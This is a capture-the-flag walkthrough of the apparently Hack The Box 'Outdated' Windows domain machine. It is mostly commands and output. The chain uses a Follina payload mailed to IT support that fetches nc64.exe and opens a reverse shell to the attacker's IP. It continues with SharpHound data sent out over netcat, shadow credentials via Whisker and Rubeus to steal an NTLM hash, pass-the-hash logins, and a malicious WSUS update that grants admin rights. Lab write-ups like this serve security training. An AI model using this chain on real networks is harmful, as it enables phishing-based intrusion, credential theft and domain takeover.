![image](https://user-images.githubusercontent.com/105310322/191048800-3175a9b4-64c0-41f5-acff-f6801d235460.png)

### Tools: smbclient, swaks, follina, whisker, rubeus, SharpWSUS

Our nmap scan shows alot of ports open but we are going to start with smb.

```console
└──╼ [★]$ nmap -A -p- -T4 -Pn 10.129.56.38
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-14 16:37 BST
Nmap scan report for 10.129.56.38
Host is up (0.14s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-14 22:47:40Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED
| Not valid before: 2022-06-18T05:50:24
|_Not valid after:  2024-06-18T06:00:24
|_ssl-date: 2022-09-14T22:49:11+00:00; +7h00m01s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED
| Not valid before: 2022-06-18T05:50:24
|_Not valid after:  2024-06-18T06:00:24
|_ssl-date: 2022-09-14T22:49:11+00:00; +7h00m01s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-09-14T22:49:11+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED
| Not valid before: 2022-06-18T05:50:24
|_Not valid after:  2024-06-18T06:00:24
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED
| Not valid before: 2022-06-18T05:50:24
|_Not valid after:  2024-06-18T06:00:24
|_ssl-date: 2022-09-14T22:49:11+00:00; +7h00m01s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8530/tcp  open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
| http-methods: 
|_  Potentially risky methods: TRACE
8531/tcp  open  unknown
49667/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49695/tcp open  msrpc         Microsoft Windows RPC
49928/tcp open  msrpc         Microsoft Windows RPC
49949/tcp open  msrpc         Microsoft Windows RPC
Service Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
| smb2-time: 
|   date: 2022-09-14T22:48:31
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 710.25 seconds
```
Checking out smb we see that we can access the Shares.....share.

```console
└──╼ [★]$ smbclient -L //outdated.htb -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Shares          Disk      
	SYSVOL          Disk      Logon server share 
	UpdateServicesPackages Disk      A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.
	WsusContent     Disk      A network share to be used by Local Publishing to place published content on this WSUS system.
	WSUSTemp        Disk      A network share used by Local Publishing from a Remote WSUS Console Instance.
SMB1 disabled -- no workgroup available
```
So we login as a guest and use get to download it to our computer.

Note: Make sure to be in a directory on your host computer that allows for files to be copied over. Ex. Do not be in a root only folder. Otherwise you may get an error when using GET on the file.

```console
└──╼ [★]$ smbclient  //outdated.htb/Shares -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jun 20 16:01:33 2022
  ..                                  D        0  Mon Jun 20 16:01:33 2022
  NOC_Reminder.pdf                   AR   106977  Mon Jun 20 16:00:32 2022

		9116415 blocks of size 4096. 1683888 blocks available
smb: \> get NOC_Reminder.pdf 
getting file \NOC_Reminder.pdf of size 106977 as NOC_Reminder.pdf (687.3 KiloBytes/sec) (average 687.3 KiloBytes/sec)
smb: \> quit
```

The files gives us an email and a list of CVE's that the victim may be vulnerable to. Since an email was given and port 25 SMTP was open I figured we could do something with sending an exploit over email. This means we will need to use the Follina exploit.


![image](https://user-images.githubusercontent.com/105310322/190208631-9d1ac727-8836-4db3-b089-28bb0edcc4c5.png)

Setting up this exploit took some time and was the most inconsistent for me, eventually I got it to work.

https://github.com/JohnHammond/msdt-follina

Be sure to add the following to your hosts file before continuing.

```
└─$ sudo vim /etc/hosts
10.129.56.56 outdated.htb mail.outdated.htb
```

Now for the next part be sure to follow exactly and hopefully this exploit will work for you. 

Note: I used 4 different Follina exploits. 1st problem was getting a callback. I.E. "GET / HTTP/1.1". After finally getting that the 2nd problem was cataching the reverse shell. Still unsure why it did not always work.

2nd Note: There are multiple ways to do this exploit and my method may not work for you. My friend had a different method that didn't work for me even though we did the same thing.

Step 1: Set up your listener

Step 2: Set up your exploit. I used john hammond follina. (I did not edit the python file, instead I copied the command from it and made the exploit run it directly)

IMPORTANT!!! Im 90% sure you have to use port 80 for this exploit to work. I never recieved a call back when I used any other port. Which means no webshells can be used. 

Basically this exploit is going to encode a malicious html file and host it on port 80. After the victim access's the link it will make them download nc64.exe from my host computer and then run it for a reverse shell.

```
└─$ sudo python3 follina.py -i 10.10.16.8 -p 80 -c "Invoke-WebRequest http://10.10.16.8/nc64.exe -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe 10.10.16.8 1234"
[+] copied staging doc /tmp/tuqxmos9
[+] created maldoc ./follina.doc
[+] serving html payload on :80
10.129.57.67 - - [17/Sep/2022 13:29:33] "GET / HTTP/1.1" 200 -
10.129.57.67 - - [17/Sep/2022 13:29:37] code 404, message File not found
10.129.57.67 - - [17/Sep/2022 13:29:37] "GET /nc64.exe HTTP/1.1" 404 -
10.129.57.67 - - [17/Sep/2022 13:30:45] "GET / HTTP/1.1" 200 -
10.129.57.67 - - [17/Sep/2022 13:30:45] "GET / HTTP/1.1" 200 -
10.129.57.67 - - [17/Sep/2022 13:30:46] "GET /nc64.exe HTTP/1.1" 200 -
10.129.57.67 - - [17/Sep/2022 13:30:46] "GET / HTTP/1.1" 200 -
```
```
└─$ sudo cp nc64.exe /tmp/tuqxmos9/www
```
```
└─$ sudo swaks --to itsupport@outdated.htb --from rogue@rogue --server mail.outdated.htb --body "http://10.10.16.8/"
```

```
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.16.8] from (UNKNOWN) [10.129.57.67] 49885
Microsoft Windows [Version 10.0.19043.928]
(c) Microsoft Corporation. All rights reserved.

C:\Users\btables\AppData\Local\Temp\SDIAG_cdf76fc7-158d-434e-aeb6-a8529783b38e>whoami
whoami
outdated\btables

C:\Users\btables\AppData\Local\Temp\SDIAG_cdf76fc7-158d-434e-aeb6-a8529783b38e>S
```

![image](https://user-images.githubusercontent.com/105310322/190871592-ebc4c3ea-140d-4063-b9ea-0f4fe245d93a.png)

https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpHound4.ps1

copy and paste base64 code into a txt file

cat sharp.txt | base64 -d sharp.gz
gzip -d sharp.gz

mkdir C:\\temp
certutil -urlcache -f http://10.10.16.8:8000/sharp.exe sharp.exe
```
C:\temp>sharp.exe -c All --zipfilename sharp.zip
sharp.exe -c All --zipfilename sharp.zip
2022-09-17T18:40:29.1352817-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-09-17T18:40:29.6040263-07:00|INFORMATION|Initializing SharpHound at 6:40 PM on 9/17/2022
2022-09-17T18:40:37.1213132-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-09-17T18:40:39.4383137-07:00|INFORMATION|Beginning LDAP search for outdated.htb
2022-09-17T18:40:39.5728042-07:00|INFORMATION|Producer has finished, closing LDAP channel
2022-09-17T18:40:39.5728042-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2022-09-17T18:41:11.6353570-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 36 MB RAM
2022-09-17T18:41:38.3852031-07:00|INFORMATION|Consumers finished, closing output channel
2022-09-17T18:41:38.5570555-07:00|INFORMATION|Output channel closed, waiting for output task to complete
2022-09-17T18:41:39.7760241-07:00|INFORMATION|Status: 64 objects finished (+64 1.066667)/s -- Using 45 MB RAM
Closing writers
2022-09-17T18:41:45.6975730-07:00|INFORMATION|Status: 97 objects finished (+33 1.469697)/s -- Using 44 MB RAM
2022-09-17T18:41:45.6975730-07:00|INFORMATION|Enumeration finished in 00:01:06.5847368
2022-09-17T18:41:47.4040166-07:00|INFORMATION|SharpHound Enumeration Completed at 6:41 PM on 9/17/2022! Happy Graphing!

C:\temp>
```

Transferring files in powershell was giving an error for using < with nc so I opted to use CMD

```
C:\temp>C:\\windows\\tasks\\nc.exe 10.10.16.8 1235 < 20220917184029_sharp.zip
```
```
└─$ nc -lvnp 1235 > sharp.zip
listening on [any] 1235 ...
connect to [10.10.16.8] from (UNKNOWN) [10.129.57.67] 49802
```

└─$ sudo neo4j console 

Analyzing the Shortest Path to unconstrained data systems

![image](https://user-images.githubusercontent.com/105310322/190872497-68e612ae-0c0a-4b73-a31b-734d86012adb.png)

Shadow Credentials

https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Whisker.ps1

└─$ cat whisker.txt | base64 -d > whisker.gz
                                                                            
(base) ┌──(rogue1㉿rogue1)-[~/Downloads]
└─$ gzip -d whisker.gz 

Rubeus.exe can be got here

https://github.com/r3motecontrol/Ghostpack-CompiledBinaries           

certutil -urlcache -f http://10.10.16.8:8000/whisker whisker.exe
certutil -urlcache -f http://10.10.16.8:8000/Rubeus.exe rubeus.exe


```console
PS C:\temp> ./whisker.exe add /target:sflowers
./whisker.exe add /target:sflowers
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] No pass was provided. The certificate will be stored with the password cftQUPqaPEblJvX1
[*] Searching for the target account
[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
[*] Generating certificate
[*] Certificate generaged
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID 7efb132a-c598-4b83-9781-962477aa5896
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] You can now run Rubeus with the following syntax:

Rubeus.exe asktgt /user:sflowers /certificate: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 /password:"cftQUPqaPEblJvX1" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show
PS C:\temp> 
```
Run the output from whisker and rubeus will do its work.

```console
   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=sflowers 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'outdated.htb\sflowers'
[*] Using domain controller: 172.16.20.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  krbtgt/outdated.htb
  ServiceRealm             :  OUTDATED.HTB
  UserName                 :  sflowers
  UserRealm                :  OUTDATED.HTB
  StartTime                :  9/17/2022 7:15:14 PM
  EndTime                  :  9/18/2022 5:15:14 AM
  RenewTill                :  9/24/2022 7:15:14 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  lzfmBNm/4pMMdM0KtrEqjg==
  ASREP (key)              :  0A7B7D2B7BA939A4C27AF3AB1020EF3A

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 1FCDB1F6015DCB318CC77BB2BDA14DB5
```

Now using the NTLM hash we can login via evil-winrm!


```console
└─$ evil-winrm -i 10.129.57.67 -u sflowers -H 1FCDB1F6015DCB318CC77BB2BDA14DB5

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\sflowers\Documents> 
```


https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpWSUS.ps1

└──╼ [★]$ evil-winrm -i 10.129.56.140 -u sflowers -H 1fcdb1f6015dcb318cc77bb2bda14db5
```
ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking WSUS
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wsus
    WSUS is using http: http://wsus.outdated.htb:8530
È You can test https://github.com/pimps/wsuxploit to escalate privileges
    And UseWUServer is equals to 1, so it is vulnerable!
```

```console
└─$ cat sharpwsus.txt | base64 -d > sharpwsus.gz 
                                                                            
(base) ┌──(rogue1㉿rogue1)-[~/Downloads]
└─$ gzip -d sharpwsus.gz    
```
```
*Evil-WinRM* PS C:\temp> certutil.exe -urlcache -f http://10.10.16.8:8000/sharpwsus sharpwsus.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```


```console
*Evil-WinRM* PS C:\temp> cmd.exe 'sharpwsus.exe create /payload:"C:\Users\sflowers\Desktop\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c \"net localgroup administrators sflowers /add\"" /title:"rogue"'

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Create Update
[*] Creating patch to use the following:
[*] Payload: PsExec64.exe
[*] Payload Path: C:\Users\sflowers\Desktop\PsExec64.exe
[*] Arguments: -accepteula -s -d cmd.exe /c \net
[*] Arguments (HTML Encoded): -accepteula -s -d cmd.exe /c \net

################# WSUS Server Enumeration via SQL ##################
ServerName, WSUSPortNumber, WSUSContentLocation
-----------------------------------------------
DC, 8530, c:\WSUS\WsusContent

ImportUpdate
Update Revision ID: 30
PrepareXMLtoClient
InjectURL2Download
DeploymentRevision
PrepareBundle
PrepareBundle Revision ID: 31
PrepareXMLBundletoClient
DeploymentRevision

[*] Update created - When ready to deploy use the following command:
[*] SharpWSUS.exe approve /updateid:24fc10f6-d8da-4231-a7c5-4c9e651318ad /computername:Target.FQDN /groupname:"Group Name"

[*] To check on the update status use the following command:
[*] SharpWSUS.exe check /updateid:24fc10f6-d8da-4231-a7c5-4c9e651318ad /computername:Target.FQDN

[*] To delete the update use the following command:
[*] SharpWSUS.exe delete /updateid:24fc10f6-d8da-4231-a7c5-4c9e651318ad /computername:Target.FQDN /groupname:"Group Name"

[*] Create complete

*Evil-WinRM* PS C:\temp> 
```
```console
*Evil-WinRM* PS C:\temp> cmd.exe \c 'sharpwsus.exe approve /updateid:24fc10f6-d8da-4231-a7c5-4c9e651318ad /computername:dc.outdated.htb /groupname:"rogue1"'

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Approve Update

Targeting dc.outdated.htb
TargetComputer, ComputerID, TargetID
------------------------------------
dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1
Group Exists = False
Group Created: rogue1
Added Computer To Group
Approved Update

[*] Approve complete

*Evil-WinRM* PS C:\temp> 


*Evil-WinRM* PS C:\temp> cmd.exe \c 'sharpwsus.exe check /updateid:24fc10f6-d8da-4231-a7c5-4c9e651318ad /computername:dc.outdated.htb'

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Check Update

Targeting dc.outdated.htb
TargetComputer, ComputerID, TargetID
------------------------------------
dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1

[*] Update is installed

[*] Check complete

*Evil-WinRM* PS C:\temp> 
```


```console
*Evil-WinRM* PS C:\temp> net user sflowers
User name                    sflowers
Full Name                    Susan Flowers
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/20/2022 11:04:09 AM
Password expires             Never
Password changeable          6/21/2022 11:04:09 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   9/17/2022 7:15:14 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use
                             *WSUS Administrators
Global Group memberships     *Domain Users
The command completed successfully.
```

└──╼ [★]$ evil-winrm -i 10.129.56.140 -u Administrator -H 716f1ce2e2cf38ee1210cce35eb78cb6
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat /users/sflowers/Desktop/user.txt
81113c27e92*********************

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
88225924900*********************
